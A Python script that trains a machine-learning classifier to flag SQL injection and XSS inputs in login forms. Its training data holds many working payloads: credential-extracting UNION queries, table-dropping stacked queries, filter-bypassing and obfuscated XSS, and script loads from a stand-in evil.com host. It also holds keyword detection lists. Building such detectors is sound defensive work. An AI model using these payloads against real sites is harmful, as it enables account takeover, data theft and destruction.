"""
Machine Learning Model for SQL Injection and XSS Attack Detection
This script trains a model to detect malicious inputs in login forms
"""

import pandas as pd
import numpy as np
from sklearn.model_selection import train_test_split
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
from sklearn.linear_model import LogisticRegression
from sklearn.naive_bayes import MultinomialNB
from sklearn.metrics import classification_report, confusion_matrix, accuracy_score
from sklearn.preprocessing import LabelEncoder
import pickle
import os
import re

class AttackDetector:
    def __init__(self):
        self.vectorizer = TfidfVectorizer(
            max_features=5000,
            ngram_range=(1, 3),
            analyzer='char',
            lowercase=True
        )
        self.model = None
        self.label_encoder = LabelEncoder()
        
    def create_training_data(self):
        """Create comprehensive training dataset for SQL injection and XSS attacks"""
        
        # Expanded SQL Injection patterns (more samples for better accuracy)
        sql_injection_samples = [
            # Basic SQL injection
            "' OR '1'='1", "' OR 1=1--", "admin'--", "' OR 'a'='a",
            "admin' OR '1'='1'--", "' OR '1'='1' --", "1' OR '1'='1",
            "admin' #", "admin'/*", "' or 1=1--", "' or 1=1#", "' or 1=1/*",
            "') or '1'='1--", "') or ('1'='1--", "1' or '1' = '1",
            "' or 1 = 1 --", "' or 'x'='x", "admin'or'1'='1",
            
            # Union-based SQL injection
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "1' UNION SELECT username, password FROM users--",
            "' UNION ALL SELECT NULL--", "' UNION SELECT @@version--",
            "' union select NULL,database()--", "' union all select 1,2--",
            
            # Blind SQL injection
            "' AND 1=1--", "' AND 1=2--", "' AND SLEEP(5)--",
            "1' AND '1'='1", "1' AND '1'='2", "' AND 'x'='x",
            "' and 1=1 --", "' and 1=0 --", "' and (select 1)--",
            
            # Time-based SQL injection
            "'; WAITFOR DELAY '00:00:05'--", "' OR SLEEP(5)--",
            "1'; SELECT SLEEP(5)--", "' AND BENCHMARK(5000000,MD5('A'))--",
            "' and sleep(5)--", "'; waitfor delay '00:00:10'--",
            
            # Stacked queries
            "'; DROP TABLE users--", "'; DELETE FROM users--",
            "'; UPDATE users SET password='hacked'--", "'; TRUNCATE TABLE users--",
            
            # Advanced patterns
            "admin' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
            "' OR 1=1 LIMIT 1--", "1' ORDER BY 10--", "1' GROUP BY 5--",
            
            # Encoded SQL injection
            "%27%20OR%201=1--", "admin%27--", "%27%20OR%20%27a%27=%27a",
            "0x61646D696E", "char(97,100,109,105,110)", "unhex('61646d696e')",
            
            # Variations and mutations
            "admin' AND '1'='1' --", "' OR '1'='1' /*", "') OR ('x'='x",
            "1' AND 'a'='a", "' OR username='admin'--", "' OR id=1--",
            "admin' and 1=1--", "' or true--", "' or true#",
            "1' or 1=1 or '1'='1", "1' UNION ALL SELECT 1,2,3--",
            "' or 'abc'='abc", "' or 'x'='x", "admin'--/*",
        ] * 2  # Duplicate for more samples
        
        # Expanded XSS patterns (more samples for better accuracy)
        xss_samples = [
            # Basic XSS
            "<script>alert(1)</script>", "<script>alert('XSS')</script>",
            "<script>alert(document.cookie)</script>", "<script>alert('test')</script>",
            "<script>confirm(1)</script>", "<script>prompt(1)</script>",
            "<script>console.log('xss')</script>", "<script>eval('alert(1)')</script>",
            
            # Image-based XSS
            "<img src=x onerror=alert(1)>", "<img src='x' onerror='alert(1)'>",
            "<img src=x onerror=alert('XSS')>", "<img/src=x onerror=alert(1)>",
            "<img src onerror=alert(1)>", '<img src="javascript:alert(1)">',
            "<img src=1 onerror=alert(1)>", "<img src=# onerror=alert(1)>",
            
            # SVG-based XSS
            "<svg onload=alert(1)>", "<svg/onload=alert(1)>",
            '<svg><script>alert(1)</script></svg>', "<svg onload=alert('XSS')>",
            "<svg onload='alert(1)'>", "<svg/onload='alert(1)'>",
            
            # Event handlers
            "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>", "<textarea onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>", "<div onmouseover=alert(1)>",
            "<h1 onclick=alert(1)>click</h1>", "<button onmouseover=alert(1)>",
            
            # JavaScript pseudo-protocol
            "javascript:alert(1)", "javascript:alert('XSS')",
            "javascript:alert(document.cookie)", "javascript:void(alert(1))",
            "javascript:fetch('http://evil.com')", "javascript:eval('alert(1)')",
            
            # Iframe injection
            "<iframe src='javascript:alert(1)'>", '<iframe src="data:text/html,<script>alert(1)</script>">',
            "<iframe onload=alert(1)>", "<iframe src=javascript:alert(1)>",
            
            # HTML5 tags
            "<video src=x onerror=alert(1)>", "<audio src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>", "<object data='javascript:alert(1)'>",
            "<embed src='javascript:alert(1)'>", "<source src=x onerror=alert(1)>",
            
            # Obfuscated XSS
            "<script>eval(atob('YWxlcnQoMSk='))</script>",
            "<script>&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;</script>",
            "<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>",
            "<script>String.fromCharCode(97,108,101,114,116,40,49,41)()</script>",
            
            # Filter bypass
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<<SCRIPT>alert(1);//<</SCRIPT>", "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<SCR\\u0049PT>alert(1)</SCRIPT>", "<script>al\\u0065rt(1)</script>",
            
            # HTML entity encoding
            "&lt;script&gt;alert(1)&lt;/script&gt;", "&#60;script&#62;alert(1)&#60;/script&#62;",
            "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
            
            # Style-based XSS
            "<style>@import'javascript:alert(1)';</style>",
            "<link rel='stylesheet' href='javascript:alert(1)'>",
            "<style>*{background:url('javascript:alert(1)')}</style>",
            "<style>body{background:url('javascript:alert(1)')}</style>",
            
            # Form-based XSS
            "<form action='javascript:alert(1)'><input type='submit'>",
            "<button onclick='alert(1)'>Click</button>",
            "<input type='text' value='x' onclick='alert(1)'>",
            "<form><input onfocus=alert(1) autofocus></form>",
            
            # Meta refresh XSS
            "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
            "<meta refresh=0 content='javascript:alert(1)'>",
            
            # Additional variations
            "<script src='http://evil.com/xss.js'></script>",
            "<img src=# onerror=alert(1)>", "<img src=/ onerror=alert(1)>",
            "onerror=alert(1)>", "onload=alert(1)>", "onclick=alert(1)>",
            "<marquee onmouseover=alert(1)>xss</marquee>",
            "<div style='background:url(\"javascript:alert(1)\")'></div>",
        ] * 2  # Duplicate for more samples
        
        # Expanded legitimate/safe inputs for better balance
        safe_samples = [
            # Normal usernames
            "admin", "user123", "john.doe", "jane_smith", "testuser",
            "administrator", "guest", "demo", "test", "root",
            "user@example.com", "john", "jane", "alice", "bob",
            "michael", "david", "sarah", "emma", "james",
            
            # Normal passwords
            "password123", "MyP@ssw0rd", "SecurePass123!", "Welcome2024",
            "Test1234", "Admin2024!", "User!Pass", "Demo@123",
            "MyPassword", "Secure123", "Password!", "Test@123",
            
            # Normal search queries
            "product name", "search term", "find items", "john smith",
            "order #12345", "invoice 2024", "report data", "user info",
            "customer details", "product id", "order number", "item name",
            
            # Common phrases
            "hello world", "test input", "sample text", "example data",
            "information", "description", "title", "name field",
            "account", "profile", "settings", "help",
            
            # Email patterns
            "user@domain.com", "test@test.com", "admin@company.com",
            "support@website.org", "info@example.net",
            "contact@email.com", "hello@gmail.com", "example@yahoo.com",
            
            # Legitimate special characters
            "John's Account", "Test & Development", "Data (2024)",
            "User: Admin", "Price: $100", "50% discount",
            "Project-2024", "Report_v2", "Document.pdf",
            
            # Additional safe inputs
            "customer_service", "tech-support", "help.desk",
            "Project2024", "Report_Final", "Document_v2",
            "Meeting Notes", "Draft Version", "Summary Report",
            "name", "email", "password", "username", "login",
            "firstname", "lastname", "phonenumber", "address",
            "city", "state", "zip", "country", "mobile",
        ] * 2  # Duplicate for balance
        
        # Create DataFrame
        data = []
        
        # Add SQL injection samples
        for sample in sql_injection_samples:
            data.append({'input': sample, 'label': 'sql_injection'})
        
        # Add XSS samples
        for sample in xss_samples:
            data.append({'input': sample, 'label': 'xss'})
        
        # Add safe samples
        for sample in safe_samples:
            data.append({'input': sample, 'label': 'safe'})
        
        # Add more variations by combining patterns
        for i in range(50):
            # Random SQL variations
            sql_var = f"' OR '{i}'='{i}"
            data.append({'input': sql_var, 'label': 'sql_injection'})
            
            # Random XSS variations
            xss_var = f"<img src=x{i} onerror=alert({i})>"
            data.append({'input': xss_var, 'label': 'xss'})
            
            # Random safe variations
            safe_var = f"user{i}@example.com"
            data.append({'input': safe_var, 'label': 'safe'})
        
        df = pd.DataFrame(data)
        return df
    
    def extract_features(self, text):
        """Extract additional features from input"""
        features = {}
        
        # Character-based features
        features['length'] = len(text)
        features['special_char_ratio'] = sum(not c.isalnum() for c in text) / max(len(text), 1)
        features['uppercase_ratio'] = sum(c.isupper() for c in text) / max(len(text), 1)
        features['digit_ratio'] = sum(c.isdigit() for c in text) / max(len(text), 1)
        
        # SQL injection indicators
        sql_keywords = ['select', 'union', 'insert', 'update', 'delete', 'drop', 'create', 
                       'alter', 'exec', 'execute', 'waitfor', 'sleep', 'benchmark']
        features['sql_keywords'] = sum(keyword in text.lower() for keyword in sql_keywords)
        features['has_quotes'] = int("'" in text or '"' in text)
        features['has_comment'] = int('--' in text or '#' in text or '/*' in text)
        features['has_semicolon'] = int(';' in text)
        
        # XSS indicators
        xss_patterns = ['<script', 'javascript:', 'onerror=', 'onload=', '<img', '<svg',
                       'alert(', 'eval(', '<iframe']
        features['xss_patterns'] = sum(pattern in text.lower() for pattern in xss_patterns)
        features['has_brackets'] = int('<' in text and '>' in text)
        features['has_parentheses'] = int('(' in text and ')' in text)
        
        return features
    
    def train(self):
        """Train the attack detection model"""
        print("Creating training data...")
        df = self.create_training_data()
        
        print(f"Total samples: {len(df)}")
        print(f"Label distribution:\n{df['label'].value_counts()}")
        
        # Encode labels
        y = self.label_encoder.fit_transform(df['label'])
        
        # Vectorize text
        print("\nVectorizing text...")
        X_text = self.vectorizer.fit_transform(df['input'])
        
        # Split data
        X_train, X_test, y_train, y_test = train_test_split(
            X_text, y, test_size=0.2, random_state=42, stratify=y
        )
        
        print(f"Training samples: {X_train.shape[0]}")
        print(f"Testing samples: {X_test.shape[0]}")
        
        # Train multiple models and select the best
        print("\nTraining models...")
        
        models = {
            'Random Forest': RandomForestClassifier(n_estimators=100, random_state=42, max_depth=20),
            'Gradient Boosting': GradientBoostingClassifier(n_estimators=100, random_state=42),
            'Logistic Regression': LogisticRegression(max_iter=1000, random_state=42),
            'Naive Bayes': MultinomialNB()
        }
        
        best_accuracy = 0
        best_model_name = None
        
        for name, model in models.items():
            print(f"\nTraining {name}...")
            model.fit(X_train, y_train)
            y_pred = model.predict(X_test)
            accuracy = accuracy_score(y_test, y_pred)
            print(f"{name} Accuracy: {accuracy:.4f}")
            
            if accuracy > best_accuracy:
                best_accuracy = accuracy
                best_model_name = name
                self.model = model
        
        print(f"\n{'='*60}")
        print(f"Best Model: {best_model_name} with accuracy: {best_accuracy:.4f}")
        print(f"{'='*60}")
        
        # Final evaluation
        y_pred = self.model.predict(X_test)
        
        print("\nClassification Report:")
        print(classification_report(y_test, y_pred, 
                                   target_names=self.label_encoder.classes_))
        
        print("\nConfusion Matrix:")
        print(confusion_matrix(y_test, y_pred))
        
        return best_accuracy
    
    def predict(self, input_text):
        """Predict if input is malicious"""
        if self.model is None:
            raise ValueError("Model not trained yet. Call train() first.")
        
        X = self.vectorizer.transform([input_text])
        prediction = self.model.predict(X)[0]
        probabilities = self.model.predict_proba(X)[0]
        
        label = self.label_encoder.inverse_transform([prediction])[0]
        confidence = max(probabilities)
        
        return {
            'label': label,
            'confidence': confidence,
            'is_malicious': label in ['sql_injection', 'xss'],
            'probabilities': {
                class_name: prob 
                for class_name, prob in zip(self.label_encoder.classes_, probabilities)
            }
        }
    
    def save_model(self, directory='ml_detection/models'):
        """Save trained model to disk"""
        os.makedirs(directory, exist_ok=True)
        
        with open(f'{directory}/vectorizer.pkl', 'wb') as f:
            pickle.dump(self.vectorizer, f)
        
        with open(f'{directory}/model.pkl', 'wb') as f:
            pickle.dump(self.model, f)
        
        with open(f'{directory}/label_encoder.pkl', 'wb') as f:
            pickle.dump(self.label_encoder, f)
        
        print(f"\nModel saved to {directory}/")
    
    def load_model(self, directory='ml_detection/models'):
        """Load trained model from disk"""
        with open(f'{directory}/vectorizer.pkl', 'rb') as f:
            self.vectorizer = pickle.load(f)
        
        with open(f'{directory}/model.pkl', 'rb') as f:
            self.model = pickle.load(f)
        
        with open(f'{directory}/label_encoder.pkl', 'rb') as f:
            self.label_encoder = pickle.load(f)
        
        print(f"Model loaded from {directory}/")


if __name__ == "__main__":
    print("="*60)
    print("SQL Injection & XSS Attack Detection Model Training")
    print("="*60)
    
    # Initialize detector
    detector = AttackDetector()
    
    # Train model
    accuracy = detector.train()
    
    # Save model
    detector.save_model()
    
    # Test with examples
    print("\n" + "="*60)
    print("Testing with example inputs:")
    print("="*60)
    
    test_cases = [
        "admin",
        "' OR '1'='1",
        "<script>alert(1)</script>",
        "john.doe@example.com",
        "'; DROP TABLE users--",
        "<img src=x onerror=alert(1)>",
        "Password123!",
        "{{7*7}}",
        "user123",
        "1' UNION SELECT NULL--"
    ]
    
    for test_input in test_cases:
        result = detector.predict(test_input)
        print(f"\nInput: {test_input}")
        print(f"Prediction: {result['label']}")
        print(f"Confidence: {result['confidence']:.2%}")
        print(f"Is Malicious: {result['is_malicious']}")
    
    print("\n" + "="*60)
    print("Training Complete!")
    print("="*60)
